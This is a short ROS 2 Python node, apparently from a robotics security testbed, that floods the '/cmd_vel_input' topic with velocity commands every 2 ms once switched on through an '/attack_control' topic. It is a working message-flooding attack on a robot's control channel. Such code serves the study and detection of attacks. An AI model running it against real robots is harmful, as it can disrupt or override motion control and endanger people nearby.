import rclpy
from rclpy.node import Node
from geometry_msgs.msg import Twist
from std_msgs.msg import String


ATTACK_TYPE = 'flooding'


class FloodAttackNode(Node):
    def __init__(self):
        super().__init__('flood_attack_node')

        self.active = False
        self.count = 0

        self.pub = self.create_publisher(Twist, '/cmd_vel_input', 10)
        self.ctrl_sub = self.create_subscription(
            String, '/attack_control', self.control_callback, 10)

        self.timer = self.create_timer(0.002, self.attack)
        self.get_logger().info(
            f'Flood Attack Node ready - idle until "{ATTACK_TYPE}: ON" received on /attack_control')

    def control_callback(self, msg):
        cmd = parse_attack_control(msg.data)
        if cmd is None:
            return
        target, state = cmd
        if target != ATTACK_TYPE:
            return
        if state == 'ON' and not self.active:
            self.active = True
            self.count = 0
            self.get_logger().warn('FLOOD attack: ON')
        elif state == 'OFF' and self.active:
            self.active = False
            self.get_logger().info(f'FLOOD attack: OFF (sent {self.count} msgs)')

    def attack(self):
        if not self.active:
            return
        msg = Twist()
        msg.linear.x = 0.1
        msg.angular.z = 0.0
        self.pub.publish(msg)
        self.count += 1
        if self.count % 500 == 0:
            self.get_logger().info(f'FLOOD: {self.count} messages sent')


def parse_attack_control(data):
    """Parse "{type}: ON|OFF" → (type, state). Returns None on malformed input."""
    if ':' not in data:
        return None
    target, _, state = data.partition(':')
    target = target.strip().lower()
    state = state.strip().upper()
    if state not in ('ON', 'OFF'):
        return None
    return target, state


def main(args=None):
    rclpy.init(args=args)
    node = FloodAttackNode()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    node.destroy_node()
    rclpy.shutdown()


if __name__ == '__main__':
    main()
